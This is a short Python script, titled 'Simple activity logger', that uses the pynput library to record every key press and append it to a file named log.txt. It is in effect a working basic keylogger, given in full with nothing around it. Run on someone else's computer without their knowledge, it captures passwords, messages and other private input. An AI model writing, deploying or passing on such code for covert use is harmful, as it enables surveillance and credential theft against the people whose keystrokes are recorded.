# Simple activity logger
from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    with open('log.txt','a') as file:
         file.write(letter)

with Listener(on_press=write_to_file) as is_listening:
    is_listening.join()

